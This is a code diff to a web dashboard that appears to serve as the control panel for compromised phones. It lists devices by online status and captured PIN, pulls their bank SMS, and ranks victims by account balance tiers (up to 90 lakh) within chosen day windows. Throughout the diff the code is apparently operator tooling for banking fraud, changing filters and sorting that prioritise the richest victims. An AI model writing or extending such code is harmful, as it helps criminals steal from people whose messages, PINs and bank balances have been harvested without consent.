@@ -153,6 +153,7 @@
   .pill:hover { border-color: var(--cyan); color: var(--cyan); }
   .pill.on { background: rgba(255,107,43,0.12); border-color: rgba(255,107,43,0.5); color: var(--orange); }
   .pill.sort-on { background: rgba(255,193,7,0.1); border-color: rgba(255,193,7,0.4); color: var(--gold); }
+  .pill.day-on { background: rgba(179,136,255,0.12); border-color: rgba(179,136,255,0.45); color: var(--purple); }
   .pill.medium-on { background: rgba(255,193,7,0.18); border-color: rgba(255,193,7,0.55); color: #ffd54f; }
   .pill.boom-on { background: rgba(255,61,0,0.18); border-color: rgba(255,107,43,0.65); color: #ff8a50; }
   .pill.start-on { background: rgba(0,230,118,0.12); border-color: rgba(0,230,118,0.45); color: var(--green); }
@@ -417,8 +418,6 @@
   <div class="actions">
     <label class="btn" style="cursor:pointer">📂 TXT<input type="file" id="fileInput" accept=".txt" hidden></label>
     <button class="btn btn-fire" id="fetchBtn">⚡ Fetch Live</button>
-    <button class="btn" id="exportBtn" style="border-color:rgba(255,193,7,0.4);color:var(--gold)">📥 Export TXT</button>
-    <button class="btn" id="refreshBtn">🔄</button>
     <span id="panelCount" style="color:var(--muted);font-size:0.75rem">0 panels</span>
   </div>
 </div>
@@ -439,11 +438,15 @@
   <button class="pill" data-filter="offline">⚫ Offline</button>
   <button class="pill" data-filter="pin">🔑 PIN</button>
   <button class="pill" data-filter="nopin">🚫 No PIN</button>
-  <button class="pill sort-on" data-sort="balance_high">⬇ High 1L–20L</button>
-  <button class="pill" data-sort="balance_boom">💥 Boom 20L–1Cr</button>
-  <button class="pill" data-sort="balance_medium">💛 Medium 5K</button>
-  <button class="pill" data-sort="balance_low">⬆ Low→High</button>
-  <button class="pill start-on" id="smsStartBtn">▶ Start Fetch</button>
+  <button class="pill sort-on" data-sort="balance_high">⬇ High 50K–90L</button>
+  <button class="pill" data-sort="balance_low">⬆ Low 2K–50K</button>
+  <button class="pill day-on" data-days="1">SMS 1d</button>
+  <button class="pill" data-days="3">SMS 3d</button>
+  <button class="pill" data-days="7">SMS 7d</button>
+  <button class="pill" data-days="15">SMS 15d</button>
+  <button class="pill" data-days="30">SMS 30d</button>
+  <button class="pill" data-days="0">All time</button>
+  <button class="pill start-on" id="smsStartBtn">▶ Start Phase Fetch</button>
   <button class="pill stop-on" id="smsStopBtn" style="display:none">⏹ Stop Fetch</button>
 </div>
 
@@ -490,30 +493,26 @@ let fetchSessionActive = false, fetchDoneVisible = false;
 const rowSigCache = new Map();
 const PANEL_BATCH = 20;
 const SMS_BATCH = 10;
-const MEDIUM_MIN = 5000;
-const MEDIUM_MAX = 9999;
-const HIGH_MIN = 100000;
-const HIGH_MAX = 2000000;
-const BOOM_MIN = 2000000;
-const BOOM_MAX = 10000000;
-const LOW_MAX = 4999;
+const HIGH_MIN = 50000;
+const HIGH_MAX = 9000000;
+const LOW_MIN = 2000;
+const LOW_MAX = 50000;
 const SORT_TIERS = {
-  balance_high: { min: HIGH_MIN, max: HIGH_MAX, label: '⬇ High 1L–20L' },
-  balance_boom: { min: BOOM_MIN, max: BOOM_MAX, label: '💥 Boom 20L–1Cr' },
-  balance_medium: { min: MEDIUM_MIN, max: MEDIUM_MAX, label: '💛 Medium 5K–8K' },
-  balance_low: { min: 1, max: LOW_MAX, label: '⬆ Low→High' }
+  balance_high: { min: HIGH_MIN, max: HIGH_MAX, label: '⬇ High 50K–90L' },
+  balance_low: { min: LOW_MIN, max: LOW_MAX, label: '⬆ Low 2K–50K' }
 };
+let globalSmsDays = 3;
 let modalIsOpen = false, modalClosing = false, modalCloseTimer = null;
 let savedScrollY = 0, lastModalHtml = '', modalTab = 'all', modalDays = 0;
 let starred = new Set();
 
 const DAY_FILTERS = [
-  { days: 2, label: '2 Days' },
-  { days: 5, label: '5 Days' },
-  { days: 10, label: '10 Days' },
-  { days: 20, label: '20 Days' },
-  { days: 30, label: '30 Days' },
-  { days: 0, label: 'All Time' }
+  { days: 1, label: '1 din' },
+  { days: 3, label: '3 din' },
+  { days: 7, label: '7 din' },
+  { days: 15, label: '15 din' },
+  { days: 30, label: '30 din' },
+  { days: 0, label: 'All time' }
 ];
 
 // ===== STRICT WHITELIST — sirf real bank SMS =====
@@ -1096,37 +1095,32 @@ function compareDevices(a, b) {
   const amtA = getDeviceSortAmount(a);
   const amtB = getDeviceSortAmount(b);
   const tier = getActiveTier();
-  if (currentSort === 'balance_high' || currentSort === 'balance_boom') {
+  if (a.status !== b.status) return b.status - a.status;
+  if (currentSort === 'balance_high') {
     const inA = tier && deviceInTier(a, tier);
     const inB = tier && deviceInTier(b, tier);
     if (inA && !inB) return -1;
     if (!inA && inB) return 1;
-    return amtB - amtA || (b.status - a.status);
-  }
-  if (currentSort === 'balance_medium') {
-    const medA = isMediumAmount(amtA);
-    const medB = isMediumAmount(amtB);
-    if (medA && !medB) return -1;
-    if (!medA && medB) return 1;
-    if (medA && medB) return amtB - amtA;
-    if (amtA > 0 && amtB <= 0) return -1;
-    if (amtA <= 0 && amtB > 0) return 1;
-    return amtB - amtA || (b.status - a.status);
+    return amtB - amtA;
   }
   if (currentSort === 'balance_low') {
     const la = amtA > 0 ? amtA : Infinity;
     const lb = amtB > 0 ? amtB : Infinity;
-    return la - lb || (b.status - a.status);
+    return la - lb;
   }
   return amtB - amtA;
 }
 
 function getFiltered() {
   let list = [...allDevices];
-  if (activeFilters.has('online')) list = list.filter(d => d.status);
-  if (activeFilters.has('offline')) list = list.filter(d => !d.status);
-  if (activeFilters.has('pin')) list = list.filter(d => hasPin(d));
-  if (activeFilters.has('nopin')) list = list.filter(d => !hasPin(d));
+  const hasOn = activeFilters.has('online');
+  const hasOff = activeFilters.has('offline');
+  if (hasOn && !hasOff) list = list.filter(d => d.status);
+  else if (hasOff && !hasOn) list = list.filter(d => !d.status);
+  const hasPinF = activeFilters.has('pin');
+  const hasNoPinF = activeFilters.has('nopin');
+  if (hasPinF && !hasNoPinF) list = list.filter(d => hasPin(d));
+  else if (hasNoPinF && !hasPinF) list = list.filter(d => !hasPin(d));
   if (searchQuery) {
     const q = searchQuery.toLowerCase();
     list = list.filter(d => [d.name, d.id, d.phone, d.panelName].join(' ').toLowerCase().includes(q));
@@ -1213,10 +1207,14 @@ function hasPin(d) {
 }
 
 function deviceInScanPool(device) {
-  if (activeFilters.has('online') && !device.status) return false;
-  if (activeFilters.has('offline') && device.status) return false;
-  if (activeFilters.has('pin') && !hasPin(device)) return false;
-  if (activeFilters.has('nopin') && hasPin(device)) return false;
+  const hasOn = activeFilters.has('online');
+  const hasOff = activeFilters.has('offline');
+  if (hasOn && !hasOff && !device.status) return false;
+  if (hasOff && !hasOn && device.status) return false;
+  const hasPinF = activeFilters.has('pin');
+  const hasNoPinF = activeFilters.has('nopin');
+  if (hasPinF && !hasNoPinF && !hasPin(device)) return false;
+  if (hasNoPinF && !hasPinF && hasPin(device)) return false;
   return true;
 }
 
@@ -1229,9 +1227,15 @@ function deviceMatchesFetchFilters(device) {
   if (!deviceInScanPool(device)) return false;
   if (device.tierSkip) return false;
   if (!device.smsLoaded) return false;
+  if (globalSmsDays > 0) {
+    const bankInDays = filterSmsByDays((device.bankSms || []).filter(m => m.avlAmount > 0), globalSmsDays);
+    if (!bankInDays.length) return false;
+  }
   if (shouldApplyTierDisplay()) {
     const tier = getActiveTier();
-    const amt = getDeviceSortAmount(device);
+    const amt = globalSmsDays > 0
+      ? getLatestBalanceInDays(device.bankSms || [], globalSmsDays)
+      : getDeviceSortAmount(device);
     return amt > 0 && deviceInTier(device, tier);
   }
   return true;
@@ -1279,7 +1283,17 @@ function getFilterLabel() {
 }
 
 function getSortLabel() {
-  return SORT_TIERS[currentSort]?.label || '⬇ High 1L–20L';
+  return SORT_TIERS[currentSort]?.label || '⬇ High 50K–90L';
+}
+
+function getSmsDaysLabel() {
+  return DAY_FILTERS.find(x => x.days === globalSmsDays)?.label || 'SMS';
+}
+
+function syncDayPills() {
+  document.querySelectorAll('[data-days]').forEach(b => {
+    b.classList.toggle('day-on', Number(b.dataset.days) === globalSmsDays);
+  });
 }
 
 function updateFetchControlBtns() {
@@ -1309,6 +1323,7 @@ function updateFilterBar() {
   if (activeFilters.has('pin')) html.push('<span class="fab-chip pin">🔑 PIN</span>');
   if (activeFilters.has('nopin')) html.push('<span class="fab-chip">🚫 No PIN</span>');
   html.push(`<span class="fab-chip sort">${getSortLabel()}</span>`);
+  html.push(`<span class="fab-chip">${getSmsDaysLabel()}</span>`);
   chips.innerHTML = html.join('');
 }
 
@@ -1364,9 +1379,6 @@ function pruneSmsQueue() {
 }
 
 function validateFetchSelection() {
-  if (!activeFilters.has('online') && !activeFilters.has('offline')) {
-    return '🟢 Online ya ⚫ Offline select karo';
-  }
   return null;
 }
 
@@ -2143,21 +2155,12 @@ document.getElementById('fileInput').addEventListener('change', e => {
 });
 
 document.getElementById('fetchBtn').addEventListener('click', () => fetchAllPanels());
-document.getElementById('exportBtn').addEventListener('click', () => exportTxt(false));
-document.getElementById('refreshBtn').addEventListener('click', () => fetchAllPanels(true));
 document.getElementById('searchBox').addEventListener('input', e => { searchQuery = e.target.value; render(); });
 
 document.querySelectorAll('[data-filter]').forEach(b => b.addEventListener('click', () => {
   const f = b.dataset.filter;
-  if (activeFilters.has(f)) {
-    activeFilters.delete(f);
-  } else {
-    if (f === 'online') activeFilters.delete('offline');
-    if (f === 'offline') activeFilters.delete('online');
-    if (f === 'pin') activeFilters.delete('nopin');
-    if (f === 'nopin') activeFilters.delete('pin');
-    activeFilters.add(f);
-  }
+  if (activeFilters.has(f)) activeFilters.delete(f);
+  else activeFilters.add(f);
   if (smsFetchActive && (smsRunning || smsQueue.length)) {
     pauseSmsFetch();
     smsQueue = [];
@@ -2169,11 +2172,20 @@ document.querySelectorAll('[data-filter]').forEach(b => b.addEventListener('clic
   pruneSmsQueue();
   updateFetchProgress();
 }));
+document.querySelectorAll('[data-days]').forEach(b => b.addEventListener('click', () => {
+  globalSmsDays = Number(b.dataset.days);
+  modalDays = globalSmsDays;
+  syncDayPills();
+  updateFilterBar();
+  lastRenderSig = '';
+  render();
+  queueSmsForFilter();
+}));
+syncDayPills();
+
 document.querySelectorAll('[data-sort]').forEach(b => b.addEventListener('click', () => {
-  document.querySelectorAll('[data-sort]').forEach(x => x.classList.remove('sort-on', 'medium-on', 'boom-on'));
+  document.querySelectorAll('[data-sort]').forEach(x => x.classList.remove('sort-on'));
   b.classList.add('sort-on');
-  if (b.dataset.sort === 'balance_medium') b.classList.add('medium-on');
-  if (b.dataset.sort === 'balance_boom') b.classList.add('boom-on');
   currentSort = b.dataset.sort;
   reapplyTierToLoaded();
   updateFilterBar();
